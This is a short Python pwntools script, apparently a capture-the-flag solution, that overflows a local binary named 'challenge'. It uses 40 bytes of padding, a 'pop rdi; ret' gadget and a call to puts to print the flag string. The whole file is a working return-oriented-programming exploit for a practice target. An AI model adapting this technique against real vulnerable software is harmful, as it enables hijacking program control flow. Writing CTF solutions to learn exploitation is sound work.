#!/usr/bin/env python3

from pwn import *

import sys

gagdet = p64(0x0040057b) # pop rdi ; ret
flag   = p64(0x00400650) # rabin -z challenge
printf = p64(0x00400589) # call_this<+9>   call <puts@plt>

payload  = cyclic(40)
payload += gagdet
payload += flag
payload += printf

p = process("./challenge")

p.sendline(payload)

print(p.recvall())
